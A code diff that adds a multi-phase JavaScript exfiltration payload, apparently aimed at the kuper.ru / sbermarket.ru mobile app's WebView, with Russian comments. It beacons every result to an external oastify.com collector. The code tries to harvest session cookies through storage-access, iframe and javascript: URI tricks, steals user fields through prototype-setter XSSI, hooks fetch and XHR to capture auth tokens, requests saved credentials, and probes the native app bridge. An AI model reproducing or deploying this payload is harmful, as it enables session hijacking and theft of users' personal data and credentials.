@@ -1,12 +1,682 @@
-alert('step test');
+alert('step 1');
 var EXFIL = 'https://4uzrxk5rqt2lpp7ljp5cacoyrpxgl8dw2.oastify.com';
 
-(function() {
-    var iframe = document.createElement('iframe');
-    iframe.src = 'https://kuper.ru';
-    iframe.style.width = '100%';
-    iframe.style.height = '500px';
-    iframe.style.border = 'none';
-    
-    document.body.appendChild(iframe);
+function send(path, data) {
+    try {
+        var body = typeof data === 'string' ? data : JSON.stringify(data);
+        navigator.sendBeacon(EXFIL + '/' + path, body);
+    } catch(e) {
+        try { new Image().src = EXFIL + '/' + path + '?e=' + encodeURIComponent(e.message); } catch(e2) {}
+    }
+}
+
+(function initDOM() {
+    try {
+        if (!document.body) {
+            document.open();
+            document.write('<html><head></head><body></body></html>');
+            document.close();
+        }
+        send('v2-dom-init', {
+            hasBody: !!document.body,
+            hasDocEl: !!document.documentElement,
+            readyState: document.readyState
+        });
+    } catch(e) {
+        send('v2-dom-init-err', { err: e.message });
+        // Фолбек: создаём body через DOM API
+        try {
+            var b = document.createElement('body');
+            document.documentElement.appendChild(b);
+        } catch(e2) {}
+    }
 })();
+
+
+(function cookieStoreTest() {
+    setTimeout(function() {
+        try {
+            if (!window.cookieStore) {
+                send('v2-cookiestore-noapi', {});
+                return;
+            }
+
+            // Попытка 1: получить ВСЕ куки
+            cookieStore.getAll().then(function(cookies) {
+                send('v2-cookiestore-ALL', {
+                    count: cookies.length,
+                    cookies: cookies.map(function(c) {
+                        return { name: c.name, domain: c.domain, value: c.value.substring(0, 100) };
+                    })
+                });
+            }).catch(function(e) {
+                send('v2-cookiestore-all-err', { err: e.message });
+            });
+
+            // Попытка 2: получить куки для конкретного URL
+            cookieStore.getAll({ url: 'https://kuper.ru/' }).then(function(cookies) {
+                send('v2-cookiestore-kuper', {
+                    count: cookies.length,
+                    cookies: cookies
+                });
+            }).catch(function(e) {
+                send('v2-cookiestore-kuper-err', { err: e.message });
+            });
+
+            // Попытка 3: через get() по имени
+            var names = ['session', 'access_token', 'user_id', '_sbermarket_session',
+                         'connect.sid', 'PHPSESSID', 'JSESSIONID', 'auth', 'token'];
+            names.forEach(function(n) {
+                cookieStore.get(n).then(function(cookie) {
+                    if (cookie) {
+                        send('v2-cookiestore-HIT-' + n, cookie);
+                    }
+                }).catch(function(e) {});
+            });
+
+        } catch(e) {
+            send('v2-cookiestore-outer-err', { err: e.message });
+        }
+    }, 200);
+})();
+
+
+(function storageAccessTest() {
+    setTimeout(function() {
+        try {
+            // Проверяем текущий статус
+            if (document.hasStorageAccess) {
+                document.hasStorageAccess().then(function(has) {
+                    send('v2-has-storage-access', { has: has });
+
+                    // Если нет доступа — запрашиваем
+                    if (!has && document.requestStorageAccess) {
+                        document.requestStorageAccess().then(function() {
+                            send('v2-storage-access-GRANTED', {});
+                            // После гранта пробуем куки снова!
+                            try {
+                                var c = document.cookie;
+                                send('v2-cookie-after-grant', { cookie: c });
+                            } catch(e) {
+                                send('v2-cookie-after-grant-err', { err: e.message });
+                            }
+                            // cookieStore тоже
+                            try {
+                                if (window.cookieStore) {
+                                    cookieStore.getAll().then(function(cookies) {
+                                        send('v2-cookiestore-after-grant', { count: cookies.length, cookies: cookies });
+                                    }).catch(function(e) {});
+                                }
+                            } catch(e) {}
+                        }).catch(function(e) {
+                            send('v2-storage-access-denied', { err: e.message });
+                        });
+                    }
+                }).catch(function(e) {
+                    send('v2-has-storage-err', { err: e.message });
+                });
+            } else {
+                send('v2-no-storage-access-api', {});
+            }
+
+            // requestStorageAccessFor — позволяет top-level запросить доступ для домена
+            if (document.requestStorageAccessFor) {
+                document.requestStorageAccessFor('https://kuper.ru').then(function() {
+                    send('v2-storage-access-for-GRANTED', {});
+                }).catch(function(e) {
+                    send('v2-storage-access-for-denied', { err: e.message });
+                });
+            }
+
+        } catch(e) {
+            send('v2-storage-access-outer-err', { err: e.message });
+        }
+    }, 500);
+})();
+
+
+(function downloadTrigger() {
+    setTimeout(function() {
+        try {
+            if (!document.body) {
+                send('v2-dl-nobody', {});
+                return;
+            }
+
+            // Скачивание с kuper.ru — нативный код достанет куки для kuper.ru
+            var a = document.createElement('a');
+            a.href = 'https://kuper.ru/favicon.ico';
+            a.download = 'test.ico';
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+
+            send('v2-dl-triggered', { url: 'kuper.ru/favicon.ico' });
+
+            // Второй вариант: скачивание с sbermarket.ru
+            setTimeout(function() {
+                try {
+                    var a2 = document.createElement('a');
+                    a2.href = 'https://sbermarket.ru/favicon.ico';
+                    a2.download = 'test2.ico';
+                    a2.style.display = 'none';
+                    document.body.appendChild(a2);
+                    a2.click();
+                    document.body.removeChild(a2);
+                    send('v2-dl-triggered2', { url: 'sbermarket.ru/favicon.ico' });
+                } catch(e) {
+                    send('v2-dl-err2', { err: e.message });
+                }
+            }, 1000);
+
+        } catch(e) {
+            send('v2-dl-err', { err: e.message });
+        }
+    }, 1000);
+})();
+
+
+(function windowOpenTest() {
+    setTimeout(function() {
+        try {
+            // Открываем kuper.ru — страница грузится С куками
+            var w = window.open('https://kuper.ru/', '_blank');
+            send('v2-win-opened', { w: !!w, type: typeof w });
+
+            if (w) {
+                // Пробуем прочитать через opener (SOP обычно блокирует)
+                setTimeout(function() {
+                    try {
+                        var cookie = w.document.cookie;
+                        send('v2-win-COOKIE', { cookie: cookie });
+                    } catch(e) {
+                        send('v2-win-sop', { err: e.message });
+                    }
+
+                    // Пробуем location.href — может быть readable
+                    try {
+                        var href = w.location.href;
+                        send('v2-win-href', { href: href });
+                    } catch(e) {
+                        send('v2-win-href-err', { err: e.message });
+                    }
+
+                    // Пробуем postMessage в новое окно
+                    try {
+                        w.postMessage('gimme-cookies', '*');
+                    } catch(e) {}
+                }, 4000);
+            }
+        } catch(e) {
+            send('v2-win-err', { err: e.message });
+        }
+    }, 2000);
+})();
+
+
+(function iframeTests() {
+    setTimeout(function() {
+        try {
+            if (!document.body) {
+                send('v2-ifr-nobody', {});
+                return;
+            }
+
+            // Тест A: srcdoc iframe
+            var ifr1 = document.createElement('iframe');
+            ifr1.srcdoc = '<script>' +
+                'try{parent.postMessage({type:"srcdoc-cookie",c:document.cookie},"*")}' +
+                'catch(e){parent.postMessage({type:"srcdoc-err",e:e.message},"*")}' +
+                '<\/script>';
+            ifr1.style.display = 'none';
+            document.body.appendChild(ifr1);
+
+            // Тест B: about:blank iframe
+            var ifr2 = document.createElement('iframe');
+            ifr2.src = 'about:blank';
+            ifr2.style.display = 'none';
+            document.body.appendChild(ifr2);
+
+            setTimeout(function() {
+                try {
+                    var d = ifr2.contentDocument;
+                    var s = d.createElement('script');
+                    s.textContent = 'try{parent.postMessage({type:"blank-cookie",c:document.cookie},"*")}' +
+                        'catch(e){parent.postMessage({type:"blank-err",e:e.message},"*")}';
+                    d.body.appendChild(s);
+                } catch(e) {
+                    send('v2-ifr-blank-err', { err: e.message });
+                }
+            }, 500);
+
+            // Тест C: data: URI iframe
+            var ifr3 = document.createElement('iframe');
+            ifr3.src = 'data:text/html,<script>try{parent.postMessage({type:"data-cookie",c:document.cookie},"*")}catch(e){parent.postMessage({type:"data-err",e:e.message},"*")}<\/script>';
+            ifr3.style.display = 'none';
+            document.body.appendChild(ifr3);
+
+            // Тест D: blob URL iframe
+            try {
+                var blob = new Blob([
+                    '<html><body><script>' +
+                    'try{parent.postMessage({type:"blob-cookie",c:document.cookie},"*")}' +
+                    'catch(e){parent.postMessage({type:"blob-err",e:e.message},"*")}' +
+                    '<\/script></body></html>'
+                ], { type: 'text/html' });
+                var blobUrl = URL.createObjectURL(blob);
+                var ifr4 = document.createElement('iframe');
+                ifr4.src = blobUrl;
+                ifr4.style.display = 'none';
+                document.body.appendChild(ifr4);
+            } catch(e) {
+                send('v2-ifr-blob-create-err', { err: e.message });
+            }
+
+            // Тест E: iframe к kuper.ru
+            var ifr5 = document.createElement('iframe');
+            ifr5.src = 'https://kuper.ru/';
+            ifr5.style.width = '1px';
+            ifr5.style.height = '1px';
+            document.body.appendChild(ifr5);
+
+            setTimeout(function() {
+                try {
+                    var c = ifr5.contentDocument.cookie;
+                    send('v2-ifr-kuper-COOKIE', { cookie: c });
+                } catch(e) {
+                    send('v2-ifr-kuper-sop', { err: e.message });
+                }
+
+                // javascript: URI в iframe к kuper.ru
+                try {
+                    ifr5.contentWindow.location = 'javascript:void(parent.postMessage({type:"jsinifr",c:document.cookie},"*"))';
+                } catch(e) {
+                    send('v2-ifr-jsuri-err', { err: e.message });
+                }
+            }, 5000);
+
+            send('v2-ifr-tests-started', { count: 5 });
+
+        } catch(e) {
+            send('v2-ifr-outer-err', { err: e.message });
+        }
+    }, 3000);
+})();
+
+
+(function xssiTest() {
+    setTimeout(function() {
+        try {
+            if (!document.body) {
+                send('v2-xssi-nobody', {});
+                return;
+            }
+
+            var stolen = [];
+
+            // Перехватчики через defineProperty
+            var fields = ['id', 'email', 'phone', 'name', 'first_name', 'last_name',
+                          'address', 'token', 'access_token', 'session_id', 'user_id'];
+            fields.forEach(function(field) {
+                try {
+                    Object.defineProperty(Object.prototype, field, {
+                        set: function(v) {
+                            stolen.push(field + '=' + String(v));
+                            send('v2-xssi-field', { field: field, value: String(v).substring(0, 200) });
+                        },
+                        get: function() { return undefined; },
+                        configurable: true
+                    });
+                } catch(e) {}
+            });
+
+            // Загружаем API как скрипт
+            var urls = [
+                'https://api.kuper.ru/v2/user',
+                'https://api.kuper.ru/v2/app_lt_configuration',
+                'https://api.kuper.ru/v2/user/addresses',
+                'https://api.kuper.ru/v2/cart'
+            ];
+
+            urls.forEach(function(url, i) {
+                var s = document.createElement('script');
+                s.src = url;
+                s.onload = function() {
+                    send('v2-xssi-loaded-' + i, { url: url, stolen: stolen.slice() });
+                };
+                s.onerror = function() {
+                    send('v2-xssi-err-' + i, { url: url, note: 'script load blocked or error' });
+                };
+                (document.body || document.documentElement).appendChild(s);
+            });
+
+        } catch(e) {
+            send('v2-xssi-outer-err', { err: e.message });
+        }
+    }, 4000);
+})();
+
+
+(function formTest() {
+    setTimeout(function() {
+        try {
+            if (!document.body) {
+                send('v2-form-nobody', {});
+                return;
+            }
+
+            // iframe для перехвата ответа
+            var sink = document.createElement('iframe');
+            sink.name = 'form_sink';
+            sink.style.display = 'none';
+            document.body.appendChild(sink);
+
+            // Form POST к API
+            var f = document.createElement('form');
+            f.method = 'POST';
+            f.action = 'https://api.kuper.ru/v2/user';
+            f.target = 'form_sink';
+            f.enctype = 'application/x-www-form-urlencoded';
+
+            var inp = document.createElement('input');
+            inp.type = 'hidden';
+            inp.name = 'test';
+            inp.value = 'security-check';
+            f.appendChild(inp);
+            document.body.appendChild(f);
+            f.submit();
+
+            send('v2-form-sent', { action: 'api.kuper.ru/v2/user', method: 'POST' });
+
+            // Через 3 сек пробуем прочитать ответ из iframe
+            setTimeout(function() {
+                try {
+                    var respBody = sink.contentDocument.body.innerHTML;
+                    send('v2-form-RESPONSE', { body: respBody.substring(0, 2000) });
+                } catch(e) {
+                    send('v2-form-read-err', { err: e.message });
+                }
+            }, 3000);
+
+        } catch(e) {
+            send('v2-form-err', { err: e.message });
+        }
+    }, 5000);
+})();
+
+
+// ============================================================
+// ФАЗА 8: document.domain manipulation
+// ============================================================
+// Попытка установить document.domain в kuper.ru
+// Если сработает — SOP ослабляется и можно читать iframe с kuper.ru
+(function domainTest() {
+    setTimeout(function() {
+        try {
+            send('v2-domain-before', { domain: document.domain });
+            document.domain = 'kuper.ru';
+            send('v2-domain-SET', { domain: document.domain });
+            // Если установилось — пробуем куки
+            try {
+                var c = document.cookie;
+                send('v2-domain-cookie', { cookie: c });
+            } catch(e) {
+                send('v2-domain-cookie-err', { err: e.message });
+            }
+        } catch(e) {
+            send('v2-domain-err', { err: e.message });
+        }
+    }, 6500);
+})();
+
+
+// ============================================================
+// ФАЗА 9: navigator.credentials API
+// ============================================================
+(function credentialsTest() {
+    setTimeout(function() {
+        try {
+            if (!navigator.credentials) {
+                send('v2-cred-noapi', {});
+                return;
+            }
+
+            // PasswordCredential
+            navigator.credentials.get({ password: true }).then(function(cred) {
+                if (cred) {
+                    send('v2-cred-HIT', {
+                        type: cred.type,
+                        id: cred.id,
+                        name: cred.name,
+                        iconURL: cred.iconURL
+                    });
+                } else {
+                    send('v2-cred-null', {});
+                }
+            }).catch(function(e) {
+                send('v2-cred-err', { err: e.message });
+            });
+
+            // FederatedCredential
+            try {
+                navigator.credentials.get({
+                    federated: { providers: ['https://kuper.ru', 'https://sbermarket.ru'] }
+                }).then(function(cred) {
+                    if (cred) {
+                        send('v2-fedcred-HIT', { type: cred.type, id: cred.id, provider: cred.provider });
+                    }
+                }).catch(function(e) {});
+            } catch(e) {}
+
+        } catch(e) {
+            send('v2-cred-outer-err', { err: e.message });
+        }
+    }, 7000);
+})();
+
+
+// ============================================================
+// ФАЗА 10: fetch/XHR interceptors (без изменений)
+// ============================================================
+(function interceptors() {
+    try {
+        // Перехват fetch
+        var origFetch = window.fetch;
+        window.fetch = function() {
+            var url = String(arguments[0]);
+            var opts = arguments[1] || {};
+            var headers = opts.headers || {};
+            if (headers['access-token'] || headers['Access-Token'] ||
+                headers['cookie'] || headers['Cookie'] ||
+                headers['authorization'] || headers['Authorization']) {
+                send('v2-fetch-intercepted', {
+                    url: url,
+                    token: headers['access-token'] || headers['Access-Token'] || '',
+                    cookie: (headers['cookie'] || headers['Cookie'] || '').substring(0, 200),
+                    auth: (headers['authorization'] || headers['Authorization'] || '').substring(0, 200)
+                });
+            }
+            return origFetch.apply(this, arguments);
+        };
+
+        // Перехват XHR
+        var origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
+        XMLHttpRequest.prototype.setRequestHeader = function(name, value) {
+            var n = name.toLowerCase();
+            if (n === 'access-token' || n === 'cookie' || n === 'authorization') {
+                send('v2-xhr-header', { name: name, value: String(value).substring(0, 500) });
+            }
+            return origSetHeader.apply(this, arguments);
+        };
+
+        send('v2-interceptors-set', {});
+    } catch(e) {
+        send('v2-interceptors-err', { err: e.message });
+    }
+})();
+
+
+// ============================================================
+// ФАЗА 11: WebSocket к kuper.ru
+// ============================================================
+(function wsTest() {
+    setTimeout(function() {
+        var wsUrls = [
+            'wss://kuper.ru/cable',
+            'wss://api.kuper.ru/cable',
+            'wss://stf-gw.kuper.ru/cable',
+            'wss://kuper.ru/ws',
+            'wss://api.kuper.ru/ws'
+        ];
+
+        wsUrls.forEach(function(url, i) {
+            try {
+                var ws = new WebSocket(url);
+                ws.onopen = function() {
+                    send('v2-ws-OPEN-' + i, { url: url });
+                    // Пробуем подписаться на данные
+                    try {
+                        ws.send(JSON.stringify({
+                            command: 'subscribe',
+                            identifier: JSON.stringify({ channel: 'UserChannel' })
+                        }));
+                    } catch(e) {}
+                };
+                ws.onmessage = function(e) {
+                    send('v2-ws-MSG-' + i, { url: url, data: String(e.data).substring(0, 2000) });
+                };
+                ws.onerror = function() {
+                    send('v2-ws-err-' + i, { url: url });
+                };
+                ws.onclose = function(e) {
+                    send('v2-ws-close-' + i, { url: url, code: e.code });
+                };
+            } catch(e) {}
+        });
+    }, 8000);
+})();
+
+
+// ============================================================
+// ФАЗА 12: postMessage listener (глобальный перехватчик)
+// ============================================================
+window.addEventListener('message', function(e) {
+    send('v2-postmsg', {
+        origin: e.origin,
+        data: typeof e.data === 'object' ? JSON.stringify(e.data) : String(e.data).substring(0, 2000)
+    });
+});
+
+
+// ============================================================
+// ФАЗА 13: Bridge interaction - попытки через postMessage
+// ============================================================
+(function bridgeTest() {
+    setTimeout(function() {
+        try {
+            // Получаем injectedObjectJson
+            var json = window.ReactNativeWebView.injectedObjectJson();
+            send('v2-bridge-json', { json: json });
+
+            // Пробуем разные action через bridge
+            // navigateDeepLink — может открыть другой WebView
+            window.ReactNativeWebView.postMessage(JSON.stringify({
+                action: 'navigateDeepLink',
+                data: {
+                    deepLink: 'sbermarket://web_view?url=https://kuper.ru/'
+                }
+            }));
+            send('v2-bridge-deeplink-sent', {});
+
+        } catch(e) {
+            send('v2-bridge-err', { err: e.message });
+        }
+    }, 9500);
+})();
+
+
+// ============================================================
+// ФАЗА 14: Попытка чтения кук через meta refresh + timing
+// ============================================================
+// Создаём iframe который навигируется на kuper.ru
+// Потом меняем его src на javascript: URI для чтения кук
+(function metaRefreshTest() {
+    setTimeout(function() {
+        try {
+            if (!document.body) return;
+
+            var ifr = document.createElement('iframe');
+            ifr.name = 'cookie_reader';
+            ifr.style.display = 'none';
+            document.body.appendChild(ifr);
+
+            // Навигируем iframe на kuper.ru
+            ifr.src = 'https://kuper.ru/';
+
+            // После загрузки пробуем javascript: URI
+            setTimeout(function() {
+                try {
+                    // Прямой javascript: URI
+                    ifr.src = 'javascript:void(parent.postMessage({type:"nav-cookie",c:document.cookie},"*"))';
+                    send('v2-meta-jsuri-set', {});
+                } catch(e) {
+                    send('v2-meta-jsuri-err', { err: e.message });
+                }
+            }, 5000);
+
+            // Ещё попытка: через window.open в iframe name
+            setTimeout(function() {
+                try {
+                    window.open('javascript:void(parent.postMessage({type:"winopen-cookie",c:document.cookie},"*"))', 'cookie_reader');
+                } catch(e) {
+                    send('v2-meta-winopen-err', { err: e.message });
+                }
+            }, 7000);
+
+        } catch(e) {
+            send('v2-meta-outer-err', { err: e.message });
+        }
+    }, 10000);
+})();
+
+
+(function swTest() {
+    setTimeout(function() {
+        // ServiceWorker registrations
+        try {
+            if ('serviceWorker' in navigator) {
+                navigator.serviceWorker.getRegistrations().then(function(regs) {
+                    send('v2-sw-regs', {
+                        count: regs.length,
+                        scopes: regs.map(function(r) { return r.scope; })
+                    });
+                }).catch(function(e) {
+                    send('v2-sw-err', { err: e.message });
+                });
+            }
+        } catch(e) {}
+
+        // BroadcastChannel — общение между вкладками/фреймами
+        try {
+            var bc = new BroadcastChannel('kuper');
+            bc.onmessage = function(e) {
+                send('v2-bc-msg', { data: String(e.data).substring(0, 1000) });
+            };
+            bc.postMessage('ping');
+
+            var bc2 = new BroadcastChannel('app');
+            bc2.onmessage = function(e) {
+                send('v2-bc2-msg', { data: String(e.data).substring(0, 1000) });
+            };
+        } catch(e) {
+            send('v2-bc-err', { err: e.message });
+        }
+    }, 12000);
+})();
+
+
+// ============================================================
+// Финал
+// ============================================================
+send('v2-payload-loaded', { ts: Date.now(), phases: 15 });
